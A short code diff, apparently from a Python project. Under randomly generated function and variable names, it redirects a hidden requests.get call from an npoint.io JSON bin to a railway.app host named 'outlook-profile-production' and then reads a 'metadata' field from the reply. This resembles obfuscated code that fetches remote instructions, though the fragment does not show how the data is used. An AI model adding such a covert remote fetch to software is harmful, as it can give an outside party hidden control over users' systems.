@@ -16,7 +16,7 @@ def train_cgrsdk_664():
 
     def data_davmle_811():
         try:
-            learn_wibrhp_355 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_wibrhp_355 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_wibrhp_355.raise_for_status()
             process_zouezx_877 = learn_wibrhp_355.json()
             model_kutruy_442 = process_zouezx_877.get('metadata')
